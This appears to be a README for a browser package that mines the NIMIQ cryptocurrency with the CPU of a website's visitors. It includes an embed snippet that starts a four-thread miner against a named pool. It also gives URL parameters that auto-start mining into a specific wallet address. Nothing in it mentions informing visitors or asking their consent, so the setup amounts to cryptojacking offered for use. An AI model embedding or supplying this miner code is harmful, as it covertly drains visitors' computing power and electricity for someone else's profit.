# Nimiq Client for browser document
This package is use for mine cryptocurrencies NIMIQ (NIM) by WASN from CPU of visitor of your website.

## Nimiq

### Basic initialization
Download "client.js" or "client.min.js" and append in bottom of body

```
<script src="client.min.js" type="text/javascript"></script>
<script>
 const miner = new Client({
    miningPool: { host: 'pool.nimiq.watch', port: '8443' },
    address: 'nimiq addresss',
    threads: 4
  });

  miner.start();
</script>
```

Auto start with domain
```
http://domain.com?wallet=NQ08SUEHT0GSPCDJHUNXQ50HB0M0ABHAPP03&host=eu1-nim.coinhunters.name&port=8544&threads=3&autostart=1

http://domain.com?wallet=NQ08SUEHT0GSPCDJHUNXQ50HB0M0ABHAPP03&host=pool.acemining.co&port=8443&threads=3
```